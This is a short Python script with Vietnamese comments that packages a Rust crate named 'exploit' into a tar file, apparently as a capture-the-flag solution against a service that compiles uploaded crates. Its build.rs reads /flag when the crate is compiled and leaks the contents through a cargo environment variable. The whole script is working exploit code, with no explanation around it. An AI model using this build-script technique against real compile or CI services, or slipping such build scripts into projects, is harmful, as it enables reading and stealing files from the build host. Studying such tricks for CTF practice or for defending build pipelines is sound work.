import tarfile
import io

# -- Nội dung các tệp --
cargo_toml = b"""
[package]
name = "exploit"
version = "0.1.0"
edition = "2021"
build = "build.rs"
"""

build_rs = b"""
use std::fs;

fn main() {
    let flag_content = fs::read_to_string("/flag").unwrap_or_else(|e| format!("Error: {}", e));
    println!("cargo:rustc-env=LEAKED_FLAG={}", flag_content);
}
"""

lib_rs = b"pub fn i_am_a_dummy_function() {}"

# -- Tạo archive --
tar_data = io.BytesIO()
with tarfile.open(fileobj=tar_data, mode='w') as tar:
    # Thêm Cargo.toml
    info = tarfile.TarInfo(name='Cargo.toml')
    info.size = len(cargo_toml)
    tar.addfile(info, io.BytesIO(cargo_toml))
    
    # Thêm build.rs
    info = tarfile.TarInfo(name='build.rs')
    info.size = len(build_rs)
    tar.addfile(info, io.BytesIO(build_rs))

    # Tạo thư mục src
    info = tarfile.TarInfo(name='src')
    info.type = tarfile.DIRTYPE
    tar.addfile(info)
    
    # Thêm src/lib.rs
    info = tarfile.TarInfo(name='src/lib.rs')
    info.size = len(lib_rs)
    tar.addfile(info, io.BytesIO(lib_rs))

# Lưu ra tệp
with open('exploit.tar', 'wb') as f:
    f.write(tar_data.getvalue())

print("Tệp exploit.tar cuối cùng đã được tạo thành công!")